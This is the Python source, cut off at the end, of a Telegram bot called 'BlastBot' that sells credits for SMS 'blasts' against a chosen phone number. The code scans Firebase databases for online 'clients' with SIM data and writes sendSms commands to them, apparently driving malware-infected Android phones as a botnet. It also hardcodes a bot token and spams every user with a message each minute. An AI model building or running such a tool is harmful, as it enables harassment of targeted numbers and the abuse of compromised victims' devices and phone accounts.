import asyncio, json, os, time, logging, random, string
from datetime import datetime

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    FSInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def _build_inline_button(label: str, emoji_id: str = None, style: str = None, **extra) -> InlineKeyboardButton:
    kwargs = dict(extra)
    if emoji_id:
        kwargs["icon_custom_emoji_id"] = emoji_id
    if style:
        kwargs["style"] = style
    try:
        return InlineKeyboardButton(text=label, **kwargs)
    except TypeError:
        kwargs.pop("style", None)
        try:
            return InlineKeyboardButton(text=label, **kwargs)
        except TypeError:
            kwargs.pop("icon_custom_emoji_id", None)
            return InlineKeyboardButton(text=label, **kwargs)

def btn(
    text: str,
    callback_data: str,
    emoji_id: str = None,
    fallback_emoji: str = "",
    style: str = None
) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    return _build_inline_button(label=label, emoji_id=emoji_id, style=style, callback_data=callback_data)

def btn_url(
    text: str,
    url: str,
    emoji_id: str = None,
    fallback_emoji: str = "",
    style: str = None
) -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if (fallback_emoji and not emoji_id) else sc(text)
    return _build_inline_button(label=label, emoji_id=emoji_id, style=style, url=url)

def style_btn(
    text: str,
    style: str = None,
    request_contact: bool = False,
    request_location: bool = False
) -> KeyboardButton:
    kwargs = {
        "text": sc(text),
        "request_contact": request_contact,
        "request_location": request_location
    }
    if style:
        kwargs["style"] = style
    try:
        return KeyboardButton(**kwargs)
    except TypeError:
        kwargs.pop("style", None)
        return KeyboardButton(**kwargs)

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

MAIN_OWNER = 8241730977
SUPER_ADMIN_NAME = "@Sakira540"
SUPER_ADMIN_LINK = "https://t.me/xtylishbedu"
SUPER_ADMINS = [8241730977]

BOT_TOKEN = "99273864914:AAGSMztMHacgkv_nhGhBNwo9EYzmnDxE_fQ8"
LOG_CHANNEL_ID = -1004437456868

_DATA_FILE = "blast_bdata.json"
_VERSION = "v3.8-COLOR-FAST"
_PROGRESS_UPDATE_INTERVAL = 1.2
_BACKGROUND_SCAN_INTERVAL = 45.0
_AUTO_MSG_INTERVAL = 60.0

SPEED_FAST = 0.05
SPEED_MEDIUM = 0.2
SPEED_SLOW = 0.5
SPEED_DEFAULT = SPEED_MEDIUM

_HTTP_SESSION: aiohttp.ClientSession | None = None
_HTTP_LOCK = asyncio.Lock()

async def get_http_session() -> aiohttp.ClientSession:
    global _HTTP_SESSION
    async with _HTTP_LOCK:
        if _HTTP_SESSION is None or _HTTP_SESSION.closed:
            connector = aiohttp.TCPConnector(limit=100, limit_per_host=25, ttl_dns_cache=300, ssl=False)
            _HTTP_SESSION = aiohttp.ClientSession(connector=connector)
        return _HTTP_SESSION

async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        s = await get_http_session()
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
        async with s.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=4)) as resp:
            res = await resp.json()
            if res.get("ok"):
                msg_id = res["result"]["message_id"]
                await asyncio.sleep(1.5)
                del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                await s.post(del_url, json={"chat_id": chat_id, "message_id": msg_id}, timeout=aiohttp.ClientTimeout(total=4))
    except Exception as e:
        log.warning(f"Fire Effect Trigger Failed: {e}")

async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}
AUTO_LOOP_LAST_MSG_IDS = {}
AUTO_LOOP_LOCK = asyncio.Lock()

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    set_auto_loop_msg = State()

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 3},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": []},
        "redeem_codes": {},
        "settings": {"ref_credits": 3, "max_owners": 6},
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "auto_loop": {
            "enabled": False,
            "message": "",
            "last_msg_ids": {}
        }
    }

def load() -> dict:
    global PROTECTED_NUMBERS, AUTO_LOOP_LAST_MSG_IDS
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if not isinstance(data.get("auto_loop"), dict):
                data["auto_loop"] = {"enabled": False, "message": "", "last_msg_ids": {}}
            else:
                data["auto_loop"].setdefault("enabled", False)
                data["auto_loop"].setdefault("message", "")
                data["auto_loop"].setdefault("last_msg_ids", {})
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                if "credits" not in u:
                    u["credits"] = 0
                if "sms_history" not in u:
                    u["sms_history"] = []
            PROTECTED_NUMBERS = dict(data.get("protected_numbers", {}))
            AUTO_LOOP_LAST_MSG_IDS = dict(data.get("auto_loop", {}).get("last_msg_ids", {}))
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d

def save(d: dict):
    try:
        tmp = f"{_DATA_FILE}.tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
        os.replace(tmp, _DATA_FILE)
    except Exception as e:
        log.error(f"Save error: {e}")

def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": []
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1000:
        d["activity_log"] = d["activity_log"][-1000:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    add_credits(new_uid, ref_credits, d)
    add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Failed to send random video: {e}")

def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn(t, c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            btn("ғᴀsᴛ", f"{prefix}:speed:fast", EMOJI_ROCKET, "🚀", style="success"),
            btn("ᴍᴇᴅɪᴜᴍ", f"{prefix}:speed:medium", EMOJI_STAR, "⚡", style="primary"),
            btn("sʟᴏᴡ", f"{prefix}:speed:slow", EMOJI_PHONE, "🐢", style="primary")
        ],
        [btn("ᴄᴀɴᴄᴇʟ", f"{prefix}:home", EMOJI_CROSS, "❌", style="danger")]
    ])

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ MEDIUM") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs ʟᴇғᴛ: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ ᴀɢᴀʀ ʙᴇᴇᴄʜ ᴍᴇɪɴ ʀᴏᴋɴᴀ ʜᴏ.</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

# ========== STRICT FIREBASE HEALTH & AUTO-CLEANUP MISSING / EXPIRED ==========
def _is_valid_firebase_rtdb_url(raw_url: str) -> bool:
    u = (raw_url or "").strip().rstrip("/")
    if not u.startswith(("http://", "https://")):
        return False
    return ("firebaseio.com" in u) or ("firebasedatabase.app" in u) or (u.count("/") >= 3)

async def check_single_firebase_health(fb: dict) -> tuple[bool, str]:
    raw_url = (fb.get("url") or "").strip().rstrip("/")
    if not _is_valid_firebase_rtdb_url(raw_url):
        return False, "missing_or_invalid_url"

    read_path = f"{raw_url}/clients.json?shallow=true"
    test_path = f"{raw_url}/_bot_health_ping.json"

    try:
        s = await get_http_session()
        async with s.get(read_path, timeout=aiohttp.ClientTimeout(total=4)) as gr:
            gtxt = (await gr.text()).strip()
            if gr.status in (401, 403, 404, 410) or "permission denied" in gtxt.lower() or "not found" in gtxt.lower():
                return False, f"expired_or_denied_{gr.status}"
            if gr.status != 200 or not gtxt:
                return False, f"read_err_{gr.status}"
            try:
                parsed = json.loads(gtxt)
            except Exception:
                return False, "invalid_json"
            if parsed is not None and not isinstance(parsed, dict):
                return False, "corrupt_root"

        async with s.put(test_path, json={"ping": int(time.time())}, timeout=aiohttp.ClientTimeout(total=3)) as pr:
            if pr.status in (401, 403, 404, 410):
                return False, f"write_denied_{pr.status}"
        async with s.delete(test_path, timeout=aiohttp.ClientTimeout(total=3)) as _:
            pass

        return True, "healthy"
    except asyncio.TimeoutError:
        return False, "timeout_missing"
    except aiohttp.ClientError:
        return False, "unreachable_expired"
    except Exception:
        return False, "broken_endpoint"

async def cleanup_bad_firebases(d: dict) -> dict:
    fbs = d.get("firebases", [])
    if not fbs:
        return {"total": 0, "kept": 0, "removed": 0, "removed_items": []}

    sem = asyncio.Semaphore(20)
    async def eval_fb(fb):
        async with sem:
            ok, reason = await check_single_firebase_health(fb)
            return fb, ok, reason

    results = await asyncio.gather(*(eval_fb(fb) for fb in fbs))
    kept_fbs = []
    removed_items = []
    removed_ids = set()

    for fb, ok, reason in results:
        if ok:
            kept_fbs.append(fb)
        else:
            removed_ids.add(fb["id"])
            removed_items.append({
                "id": fb["id"],
                "label": fb.get("label", fb.get("url", "Unknown"))[:28],
                "url": fb.get("url", ""),
                "reason": reason
            })

    d["firebases"] = kept_fbs
    save(d)

    global CACHED_DEVICES, FB_DEVICE_COUNTS
    if removed_ids:
        CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") not in removed_ids]
        for rid in removed_ids:
            FB_DEVICE_COUNTS.pop(rid, None)

    return {
        "total": len(fbs),
        "kept": len(kept_fbs),
        "removed": len(removed_items),
        "removed_items": removed_items
    }

# ========== EVERY-1-MINUTE AUTO MESSAGE TO ALL USERS + AUTO DELETE PREVIOUS ==========
async def run_auto_loop_tick(bot: Bot):
    async with AUTO_LOOP_LOCK:
        d = load()
        loop_cfg = d.get("auto_loop", {})
        if not loop_cfg.get("enabled"):
            return
        msg_body = (loop_cfg.get("message") or "").strip()
        if not msg_body:
            return

        users = d.get("users", {})
        if not users:
            return

        last_ids = dict(loop_cfg.get("last_msg_ids", {}))
        updated_ids = dict(last_ids)

        formatted_text = (
            f"{em(EMOJI_BELL, '🔔')} <b>{sc('auto live update')}</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"{msg_body}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<i>{em(EMOJI_GEAR, '🔄')} ᴀᴜᴛᴏ-ʀᴇғʀᴇsʜ ᴇᴠᴇʀʏ 1 ᴍɪɴ • ᴏᴡɴᴇʀ: {SUPER_ADMIN_NAME}</i>"
        )

        sem = asyncio.Semaphore(15)

        async def send_and_clean(uid_str: str):
            async with sem:
                try:
                    target_uid = int(uid_str)
                except ValueError:
                    return
                if is_banned(target_uid, d):
                    return

                prev_mid = last_ids.get(uid_str)
                if prev_mid:
                    try:
                        await bot.delete_message(chat_id=target_uid, message_id=int(prev_mid))
                    except Exception:
                        pass

                try:
                    sent_msg = await bot.send_message(
                        chat_id=target_uid,
                        text=formatted_text,
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    )
                    updated_ids[uid_str] = sent_msg.message_id
                except Exception as e:
                    log.debug(f"Auto loop send failed for {uid_str}: {e}")

        await asyncio.gather(*(send_and_clean(u) for u in list(users.keys())))
        d["auto_loop"]["last_msg_ids"] = updated_ids
        save(d)

async def background_auto_user_messenger(bot: Bot):
    log.info("Background 1-Min Auto User Messenger STARTED")
    while True:
        await asyncio.sleep(_AUTO_MSG_INTERVAL)
        try:
            await run_auto_loop_tick(bot)
        except Exception as e:
            log.error(f"[AUTO-LOOP] Error: {e}")

def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} 0 ᴀᴘɪs ᴏɴʟɪɴᴇ"
    device_count = len(CACHED_DEVICES)
    time_diff = time.time() - LAST_SCAN_TIME
    if time_diff < 90:
        return f"{em(EMOJI_CHECK, '🟢')} {device_count} ᴀᴘɪs/ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ"
    elif time_diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {device_count} ᴏɴʟɪɴᴇ ({int(time_diff/60)}ᴍ)"
    else:
        return f"{em(EMOJI_CROSS, '🔴')} {device_count} ᴏɴʟɪɴᴇ ({int(time_diff/60)}ᴍ)"

async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS, DEVICE_HEALTH_LOG
    log.info("Background Firebase Scanner STARTED")
    first_scan_done = False

    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5)
                continue
            SCANNING_IN_PROGRESS = True

        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ ғɪʀᴇʙᴀsᴇ ᴀᴘɪs..."
        start_scan = time.time()

        try:
            d = load()
            fbs = d.get("firebases", [])
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ ᴅʙs"
                CACHED_DEVICES = []
                FB_DEVICE_COUNTS.clear()
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue

            devices = await asyncio.wait_for(get_all_online_devices(d), timeout=25.0)
            scan_duration = time.time() - start_scan
            CACHED_DEVICES = devices
            LAST_SCAN_TIME = time.time()

            for fb in fbs:
                fb_id = fb["id"]
                fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {
                    "label": fb_label,
                    "online": fb_online,
                    "last_update": int(time.time())
                }

            current_fb_ids = {fb["id"] for fb in fbs}
            for stale in [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]:
                FB_DEVICE_COUNTS.pop(stale, None)

            DEVICE_HEALTH_LOG.append({
                "timestamp": int(time.time()),
                "devices_found": len(devices),
                "dbs_scanned": len(fbs),
                "duration_sec": round(scan_duration, 2),
                "status": "healthy" if devices else "no_devices"
            })
            if len(DEVICE_HEALTH_LOG) > 100:
                DEVICE_HEALTH_LOG = DEVICE_HEALTH_LOG[-100:]

            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴏɴʟɪɴᴇ | {fmt_time(int(time.time()))}"
                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('background scanner active!')}</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} ᴏɴʟɪɴᴇ ᴀᴘɪs/ᴅᴇᴠɪᴄᴇs: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇ: <b>{scan_duration:.1f}s</b>",
                            parse_mode="HTML"
                        )
                    except Exception:
                        pass
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} 0 ᴏɴʟɪɴᴇ | {fmt_time(int(time.time()))}"

        except asyncio.TimeoutError:
            SCAN_STATUS = f"{em(EMOJI_WARNING, '⏱')} sᴄᴀɴ ᴛɪᴍᴇᴏᴜᴛ"
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[BG-SCAN] Error: {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False

        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    s = await get_http_session()
    for attempt in range(2):
        try:
            async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=4)) as r:
                if 200 <= r.status < 300:
                    return True
        except Exception as e:
            log.warning(f"fb_put attempt {attempt+1}: {e}")
        await asyncio.sleep(0.15)
    return False

def device_is_online(device_data: dict) -> bool:
    if not isinstance(device_data, dict):
        return False
    if device_data.get("isOnline") is True or device_data.get("online") is True or device_data.get("connected") is True:
        return True
    if device_data.get("status") in ("online", "active", True, 1):
        return True
    if device_data.get("sims") or device_data.get("sim1") or device_data.get("sim2") or device_data.get("phoneNumber"):
        if device_data.get("status") not in ("offline", False, 0):
            return True
    return False

async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs:
        return []
    results = []
    _fb_sem = asyncio.Semaphore(25)
    _dev_sem = asyncio.Semaphore(35)
    s = await get_http_session()

    async def fetch_one(fb: dict):
        base = fb["url"].rstrip("/")
        shallow_url = f"{base}/clients.json?shallow=true"
        async with _fb_sem:
            try:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=3.5)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if not txt or txt == "null":
                        return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict) or not device_ids:
                        return

                    async def fetch_dev(dev_id: str):
                        try:
                            url = f"{base}/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=3.0)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if not txt2 or txt2 == "null":
                                            return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_data.get("model") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {
                                                "fb_id": fb["id"],
                                                "fb_url": fb["url"],
                                                "fb_label": fb.get("label", fb["url"][:30]),
                                                "dev_id": dev_id,
                                                "dev_name": str(name),
                                                "sims": sims if isinstance(sims, list) else [],
                                            }
                        except Exception:
                            return None
                        return None

                    dev_ids = list(device_ids.keys())[:100]
                    dev_results = await asyncio.gather(*(fetch_dev(dev_id) for dev_id in dev_ids))
                    for res in dev_results:
                        if res:
                            results.append(res)
            except Exception:
                return

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    missing = []
    for ch in fj.get("channels", []):
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
